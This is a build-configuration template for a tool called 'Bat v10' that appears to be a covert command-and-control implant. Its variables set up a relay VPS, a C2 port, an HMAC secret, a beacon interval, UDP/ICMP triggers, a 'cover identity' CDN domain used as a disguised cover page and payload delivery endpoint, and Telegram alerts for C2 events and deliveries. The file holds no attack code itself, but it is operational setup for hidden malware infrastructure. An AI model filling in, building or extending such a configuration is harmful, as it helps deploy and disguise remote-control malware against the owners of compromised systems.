# build.env Bat v10 build variables
# Copy to build.env and fill in values before running build.sh or make.
#
# Usage:
# cp build.env.example build.env
# nano build.env
# ./build.sh

# Relay 
RELAY_IP= # public IP of the relay VPS  (e.g. 1.2.3.4)
BAT_KEY=~/.ssh/id_rsa # SSH key for relay access

# Ports (do not change without reason) 
C2_PORT=9443
KCC_PORT=9444

# HMAC Secret 
# Generate: openssl rand -hex 16
SECRET=

# Beacon 
BEACON_INTERVAL=30s
TRIGGER=udp # udp | icmp | both

# Cover identity 
# Domain served by the relay as cover page and delivery endpoint.
# sync.sh substitutes __CDN_DOMAIN__ in relay/static/ files with this value.
CDN_DOMAIN= # e.g. cdn.example.com  (no https://)

# Telegram (C2 notifications + relay delivery-alert) 
# Copy from ~/.bat.env or generate at https://t.me/BotFather
TG_TOKEN=
TG_CHAT_ID=

# CDN proxy (optional only for the cdn make profile) 
# CDN_HOST=cdn.example.com:443
